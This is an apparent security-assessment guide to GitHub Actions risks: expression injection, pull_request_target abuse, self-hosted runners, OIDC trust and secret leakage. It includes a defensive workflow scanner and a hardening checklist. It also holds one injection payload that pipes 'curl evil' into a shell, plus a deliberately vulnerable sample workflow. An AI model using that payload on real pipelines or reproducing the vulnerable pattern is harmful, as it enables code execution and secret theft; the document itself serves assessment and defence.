---
title: "CI/CD - GitHub Actions Injection, Self-Hosted Runners, OIDC and Secret Leakage"
category: cloud
subcategory: cicd
type: technique
tags: [cloud, cicd, github-actions, workflow, injection, pull-request-target, self-hosted-runner, oidc, secrets, gitlab-ci, pipeline, poisoned-pipeline, ppe, expression-injection, environment]
difficulty: medium
summary: "CI pipelines run attacker-influenced input with access to secrets and cloud identity; the wins are expression injection, poisoned PRs, runner takeover, and over-broad OIDC trust."
when_to_use:
  - "The target has a public GitHub/GitLab repository with workflows"
  - "You see pull_request_target, workflow_run, or self-hosted runners"
  - "The pipeline uses OIDC to assume a cloud role"
  - "Build logs, artifacts, or pipeline env are reachable"
tools: [git, gh, act, gitlab-ci-lint]
related: [aws-enumeration-privesc, cloud-metadata-ssrf, serverless-attacks, object-storage-misconfig]
---

## TL;DR

A CI pipeline is code execution triggered by events you can often influence (a PR, an issue title,
a branch name), running with access to repository secrets and - increasingly - a cloud identity via
OIDC. The four recurring failures: untrusted input interpolated into a shell step (expression
injection), `pull_request_target` running privileged on fork code (Pwn Request), self-hosted runners
reused across jobs, and OIDC trust policies that are too broad.

## Recognise it

- A workflow triggered by `pull_request_target`, `workflow_run`, or `issue_comment` that then checks
  out or runs the PR's code.
- `run:` steps containing `${{ github.event.* }}` - PR title, body, branch name, commit message.
- `runs-on: [self-hosted, ...]` on a public repository.
- A step that configures cloud credentials via OIDC (`aws-actions/configure-aws-credentials` with
  `role-to-assume`, `permissions: id-token: write`).
- Reachable build logs or downloadable artifacts.

## Theory

### The trigger trust boundary

GitHub Actions triggers differ crucially in *what token and secrets they expose*:

- **`pull_request`** (from a fork): runs with a **read-only** `GITHUB_TOKEN` and **no secrets**.
  Safe to run fork code because it cannot do much.
- **`pull_request_target`**: runs in the context of the **base** repository - full read/write
  `GITHUB_TOKEN` and **access to secrets** - but the triggering `github.event` still describes the
  attacker's PR. If such a workflow checks out and runs the PR's code (e.g. `actions/checkout` with
  `ref: ${{ github.event.pull_request.head.sha }}` then `npm install`/`make`), the attacker's code
  executes with secrets. This is the "Pwn Request".
- **`workflow_run`**: runs after another workflow, in the base context with secrets - a common
  laundering path for the same problem.
- **`issue_comment`, `issues`**: fire on attacker-controlled text.

### Expression injection

GitHub interpolates `${{ ... }}` **before** the shell runs, by textual substitution. So:

```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

If the PR title is `"; curl evil | sh; echo "`, the substitution produces a shell command. The
injectable contexts are all attacker-controlled: `pull_request.title`, `.body`,
`head.ref` (branch name), `.head.label`, commit messages, `issue.title`, review bodies. The fix is
to pass them through an intermediate `env:` variable and quote it, never inline into `run:`.

### Self-hosted runner reuse

Self-hosted runners are not ephemeral by default. On a public repo, a `pull_request` from a fork can
schedule a job onto the runner; if the runner persists state between jobs (installed tools, cached
credentials, the working directory), a later privileged job can be poisoned, or the attacker's job
can read what previous jobs left behind. GitHub explicitly warns against self-hosted runners on
public repositories for this reason.

### OIDC trust abuse

Modern pipelines avoid long-lived cloud keys by exchanging a signed OIDC token for a short-lived
cloud role (`sts:AssumeRoleWithWebIdentity`). The security rests entirely on the cloud role's **trust
policy** `sub`/`aud` conditions. Common mistakes:

- `token.actions.githubusercontent.com:sub` condition wildcarded to `repo:org/*:*` or missing
  entirely -> any repo/branch/PR in the org (or anywhere) can assume the role.
- Trusting `ref` but not `environment`, so a PR branch qualifies.
- No `aud` condition.

A too-broad trust policy means a workflow the attacker can trigger (or a fork) mints cloud
credentials.

### Secret leakage in logs and artifacts

GitHub masks known secret *values* in logs, but only exact matches - a base64 or transformed secret
prints in the clear. Artifacts and caches can contain `.env` files, tokens, or the checked-out
`.git` with credentials. `set -x` / debug logging dumps environment.

## Procedure (assessment)

```bash
# read the workflows
ls .github/workflows/
grep -rnE 'pull_request_target|workflow_run|issue_comment' .github/workflows/
# find expression injection: attacker-controlled context in a run: step
grep -rnE '\$\{\{\s*github\.event\.(pull_request|issue|comment|head_commit)' .github/workflows/
# find self-hosted runners
grep -rn 'self-hosted' .github/workflows/
# find OIDC usage and inspect the assumed role + conditions
grep -rn 'id-token\|configure-aws-credentials\|role-to-assume' .github/workflows/
# GitLab equivalent
cat .gitlab-ci.yml
grep -nE 'CI_JOB_TOKEN|rules:|when: always|tags:' .gitlab-ci.yml
```

Then reason about each finding: what event can the attacker cause, what does the token/secret scope
allow, and does any step run attacker-controlled code or interpolate attacker text.

## Code - a workflow static-analysis reporter

```python
#!/usr/bin/env python3
"""Static, read-only analysis of GitHub Actions workflows for common CI/CD risks.

Reports risky triggers, expression-injection sinks, self-hosted runners, and OIDC
usage. It only reads YAML files; it changes nothing and triggers nothing.

Python 3.11+, standard library only (no PyYAML: uses a tolerant line scanner so it
works on any workflow without extra deps).
"""
from __future__ import annotations

import os
import re
import sys

RISKY_TRIGGERS = ("pull_request_target", "workflow_run", "issue_comment", "issues")

# Attacker-controlled expression contexts that are dangerous inside run: steps.
INJECTABLE = re.compile(
    r"\$\{\{\s*github\.event\.(?:"
    r"pull_request\.(?:title|body|head\.ref|head\.label)|"
    r"issue\.(?:title|body)|comment\.body|head_commit\.message|"
    r"pull_request\.head\.repo\.default_branch"
    r")",
    re.I,
)
GENERIC_EVENT_EXPR = re.compile(r"\$\{\{\s*github\.(?:event|head_ref)\b", re.I)
RUN_STEP = re.compile(r"^\s*(-\s*)?run\s*:", re.I)
SELF_HOSTED = re.compile(r"runs-on\s*:.*self-hosted", re.I)
OIDC_PERM = re.compile(r"id-token\s*:\s*write", re.I)
OIDC_ROLE = re.compile(r"role-to-assume\s*:", re.I)


def scan_file(path: str) -> list[str]:
    findings: list[str] = []
    with open(path, "r", errors="replace") as fh:
        lines = fh.readlines()
    text = "".join(lines)

    for trig in RISKY_TRIGGERS:
        if re.search(rf"^\s*{trig}\s*:", text, re.M) or re.search(rf"\b{trig}\b", text):
            findings.append(f"risky trigger: {trig}")

    in_run = False
    for i, line in enumerate(lines, 1):
        if RUN_STEP.search(line):
            in_run = True
        elif re.match(r"^\s*-?\s*(uses|with|name|env|id|shell)\s*:", line):
            in_run = False
        # injection is dangerous specifically inside a run: block
        if INJECTABLE.search(line):
            sev = "HIGH (attacker-controlled expression in a step)" if in_run else "note"
            findings.append(f"line {i}: expression injection {sev}: {line.strip()[:100]}")
        elif in_run and GENERIC_EVENT_EXPR.search(line):
            findings.append(f"line {i}: event expression inside run: (review): {line.strip()[:100]}")
        if SELF_HOSTED.search(line):
            findings.append(f"line {i}: self-hosted runner (risky on public repos)")
        if OIDC_PERM.search(line):
            findings.append(f"line {i}: OIDC id-token:write (check the cloud role trust policy)")
        if OIDC_ROLE.search(line):
            findings.append(f"line {i}: assumes a cloud role via OIDC: {line.strip()[:100]}")
    return findings


def find_workflows(root: str) -> list[str]:
    wf_dir = os.path.join(root, ".github", "workflows")
    if not os.path.isdir(wf_dir):
        # maybe we were pointed straight at the workflows dir or a file
        if os.path.isfile(root):
            return [root]
        if os.path.isdir(root):
            return [os.path.join(root, f) for f in os.listdir(root)
                    if f.endswith((".yml", ".yaml"))]
        return []
    return [os.path.join(wf_dir, f) for f in os.listdir(wf_dir)
            if f.endswith((".yml", ".yaml"))]


def main() -> int:
    root = sys.argv[1] if len(sys.argv) > 1 else "."
    files = find_workflows(root)
    if not files:
        print(f"no workflow files found under {root}")
        return 1
    total = 0
    for path in sorted(files):
        findings = scan_file(path)
        print(f"\n=== {path} ===")
        if not findings:
            print("  no obvious issues")
            continue
        for f in findings:
            marker = "[!]" if "HIGH" in f or "self-hosted" in f or "risky trigger" in f else "   "
            print(f"  {marker} {f}")
            total += 1
    print(f"\n{total} finding(s) across {len(files)} workflow file(s)")
    return 0


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        import tempfile
        sample = """
name: pr
on:
  pull_request_target:
    types: [opened]
permissions:
  id-token: write
jobs:
  build:
    runs-on: [self-hosted, linux]
    steps:
      - run: echo "title is ${{ github.event.pull_request.title }}"
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123:role/ci
"""
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as tf:
            tf.write(sample)
            name = tf.name
        fnd = scan_file(name)
        os.unlink(name)
        joined = " | ".join(fnd)
        assert "pull_request_target" in joined
        assert "expression injection" in joined
        assert "self-hosted" in joined
        assert "OIDC" in joined
        print("[+] self-test ok")
        sys.exit(0)
    sys.exit(main())
```

## Variants & pitfalls

- **`pull_request` (fork) is safe; `pull_request_target` is not.** The distinction is the whole
  bug - the latter exposes secrets and a write token while still running in response to a fork PR.
- **Checkout of the PR head is the trigger for the Pwn Request**: `pull_request_target` +
  `actions/checkout` with the PR ref + any build step that runs the checked-out code.
- **Expression injection sinks are textual** - the payload lands in the title, branch name, commit
  message, or comment body. The fix (env var + quoting) is the tell that a maintainer understood it.
- **Secret masking is exact-match only**: a secret that is transformed (base64, uppercased, split)
  prints in logs.
- **`GITHUB_TOKEN` scope**: default permissions can be `write-all` on older repos; a leaked token
  can push, open PRs, or modify releases within the repo.
- **Self-hosted runners on public repos** are discouraged by GitHub precisely because fork PRs can
  land jobs on them; look for persistence between jobs (non-ephemeral runners).
- **OIDC `sub` claim format** is `repo:ORG/REPO:ref:refs/heads/BRANCH` or
  `repo:ORG/REPO:pull_request` or `repo:ORG/REPO:environment:NAME`. A trust policy that wildcards
  any of these too loosely is the finding.
- **GitLab**: `CI_JOB_TOKEN` scope, protected vs unprotected variables (unprotected leak to feature
  branches), and runner tags determine exposure; `rules: when: always` on a broadly-triggered job is
  a smell.
- **Third-party actions** pinned by tag (not SHA) can be re-pointed by the action's owner - a supply
  chain risk.

## Hardening checklist

- Use `pull_request` (not `pull_request_target`) for fork CI; if `pull_request_target` is required,
  never check out or execute the PR's code, and split trusted/untrusted work.
- Pass untrusted `github.event` values through `env:` and quote them; never inline into `run:`.
- Prefer GitHub-hosted or ephemeral self-hosted runners; do not use persistent self-hosted runners
  on public repos.
- Set `permissions:` to least privilege at the workflow/job level; default the `GITHUB_TOKEN` to
  read-only.
- Scope OIDC trust policies tightly with `sub` (exact repo + ref/environment) and `aud` conditions.
- Pin third-party actions by full commit SHA.

## Tools

- `gh` CLI, `act` (run workflows locally), `actionlint` (workflow linter).
- `gitleaks`, `trufflehog` - secrets in git history and logs.
- `Poutine`, `zizmor`, `octoscan` - CI/CD workflow security scanners.

## References

- GitHub documentation: "Security hardening for GitHub Actions" (untrusted input, `pull_request_target`,
  self-hosted runners, OIDC).
- GitHub documentation: "About security hardening with OpenID Connect".
